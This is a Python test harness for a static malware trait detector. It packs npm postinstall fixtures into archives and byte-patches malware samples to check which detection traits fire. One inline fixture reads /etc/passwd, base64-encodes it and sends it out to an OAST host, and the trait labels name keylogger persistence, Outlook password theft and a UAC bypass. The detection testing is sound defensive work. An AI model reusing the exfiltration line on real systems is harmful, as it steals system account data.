#!/usr/bin/env python3
"""Static source/sink and removed-leg controls. Never executes sample code."""
import argparse
import io
import json
import os
from pathlib import Path
import subprocess
import tarfile

ROOT = Path(__file__).resolve().parents[3]
HERE = Path(__file__).resolve().parent
IDENTITY = 'objectives/exfiltration/stealer/system-info/identity::'
ENCODED = IDENTITY + 'npm-postinstall-base64-host-identity-get'
TUNNEL = IDENTITY + 'npm-postinstall-ngrok-host-identity-get'
CALLBACK = 'objectives/exfiltration/oob/callback::dependency-confusion-postinstall-ngrok-beacon'
ACCOUNT = 'objectives/persistence/login/account/create::native-keylogger-account-provisioning-logon-concealment'
MAIL = 'objectives/credential-access/email/outlook::native-keylogger-outlook-password-decryption'
ELEVATE = 'objectives/privilege-escalation/elevation-control/uac-bypass/com::elevated-file-operation-pkgmgr-dll-staging'
RC4 = 'micro-behaviors/crypto/symmetric/stream/rc4::x86-spilled-index-byte-state-prga'
MEMORY = 'micro-behaviors/mem/combined::enumerated-remote-memory-write-api-profile'


def archive(path, script, disclosure=True):
    manifest = {'name': 'fixture', 'version': '1.0.0',
                'scripts': {'postinstall': 'node index.js'}}
    if disclosure:
        manifest['description'] = 'Dependency Confusion to RCE'
    with tarfile.open(path, 'w:gz') as out:
        for name, text in [('package/index.js', script),
                           ('package/package.json', json.dumps(manifest))]:
            data = text.encode()
            info = tarfile.TarInfo(name)
            info.size = len(data)
            out.addfile(info, io.BytesIO(data))


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--sample', type=Path, required=True)
    parser.add_argument('--helper', type=Path, required=True)
    parser.add_argument('--external-canary', type=Path)
    parser.add_argument('--scratch', type=Path, required=True)
    args = parser.parse_args()
    args.scratch.mkdir(parents=True, exist_ok=True)
    cases = []
    for name, present, absent in [
        ('bound-host-canary', {ENCODED, TUNNEL, CALLBACK}, set()),
        ('local-host-fixed-status', {CALLBACK}, {ENCODED, TUNNEL}),
        ('unrelated-base64', {CALLBACK}, {ENCODED, TUNNEL}),
    ]:
        path = args.scratch / (name + '.tgz')
        archive(path, (HERE / (name + '.js')).read_text())
        cases.append((path, present, absent))
    # Same operations without an attack claim: fixed status request sends
    # neither the locally serialized hostname nor its encoded representation.
    path = args.scratch / 'ordinary-status.tgz'
    archive(path, (HERE / 'local-host-fixed-status.js').read_text(), False)
    cases.append((path, set(), {ENCODED, TUNNEL, CALLBACK}))
    # Existing positive outside this batch: preserve the Base64 OAST export.
    path = args.scratch / 'retained-host-user-oast.tgz'
    archive(path, (ROOT / 'testdata/hostile/host-json-base64-oast-profile.js').read_text())
    cases.append((path, {ENCODED}, set()))
    # The previous host-query alternative included /etc/passwd. Keep that
    # source under account-db rather than dropping it when tightening flow.
    path = args.scratch / 'retained-passwd-export.tgz'
    archive(path, "const https = require('https'); const fs = require('fs');\n"
            "const data = Buffer.from(JSON.stringify(fs.readFileSync('/etc/passwd', 'utf8'))).toString('base64');\n"
            "https.get(`https://audit.oastify.com/report?d=${data}`, () => {});\n")
    cases.append((path, {'objectives/exfiltration/stealer/account-db::npm-postinstall-base64-passwd-get'}, set()))
    if args.external_canary:
        with tarfile.open(args.external_canary) as original:
            script = original.extractfile('package/canary.js').read().decode()
        path = args.scratch / 'external-canary-postinstall-variant.tgz'
        archive(path, script, False)
        cases.append((path, {ENCODED, TUNNEL}, {CALLBACK}))
    cases.append((args.sample, {ACCOUNT, MAIL, ELEVATE, RC4, MEMORY}, set()))
    data = args.sample.read_bytes()
    for label, old, new, absent in [
        ('no-account-create', b'NetUserAdd\0', b'NetUserGet\0', ACCOUNT),
        ('no-rc4-buffer-xor', bytes.fromhex('0fb6c08a0418300141'), bytes.fromhex('0fb6c08a0418000141'), RC4),
        ('no-account-concealment-key', b'SpecialAccounts\\UserList', b'SpecialAccounts\\UserTest', ACCOUNT),
        ('no-mail-password-value', 'SMTP Password'.encode('utf-16le'), 'SMTP Passw0rd'.encode('utf-16le'), MAIL),
    ]:
        assert old in data and len(old) == len(new)
        path = args.scratch / (label + '.exe')
        path.write_bytes(data.replace(old, new))
        cases.append((path, set(), {absent}))
    helper = args.helper.read_bytes()
    cases.append((args.helper, {ELEVATE}, set()))
    for label, old, new in [
        ('no-fileoperation-class', '3ad05575'.encode('utf-16le'), '3ad05576'.encode('utf-16le')),
        ('no-dism-load-target', 'dismcore.dll'.encode('utf-16le'), 'ordinary.dll'.encode('utf-16le')),
    ]:
        assert old in helper and len(old) == len(new)
        path = args.scratch / (label + '.exe')
        path.write_bytes(helper.replace(old, new))
        cases.append((path, set(), {ELEVATE}))
    result = subprocess.run([os.environ.get('CLEAVE', 'cleave'), '--traits-dir', str(ROOT),
                             '--format', 'jsonl', *[str(p) for p, _, _ in cases]],
                            capture_output=True, text=True)
    assert result.returncode == 0, result.stderr
    reports = [json.loads(line) for line in result.stdout.splitlines() if line.strip()]
    (args.scratch / 'reports.jsonl').write_text(result.stdout)
    assert len(reports) == len(cases), (len(reports), len(cases), result.stderr)
    records = []
    for (path, present, absent), report in zip(cases, reports):
        traits = {t['id']: t['crit'] for f in report['files'] for t in f.get('traits', [])}
        assert present <= traits.keys(), (path.name, 'missing', present - traits.keys())
        assert not absent.intersection(traits), (path.name, 'unexpected', absent.intersection(traits))
        records.append({'case': path.name, 'present': sorted(present), 'absent': sorted(absent), 'passed': True})
        print('PASS', path.name)
    (args.scratch / 'focused-results.json').write_text(json.dumps(records, indent=2) + '\n')


if __name__ == '__main__':
    main()
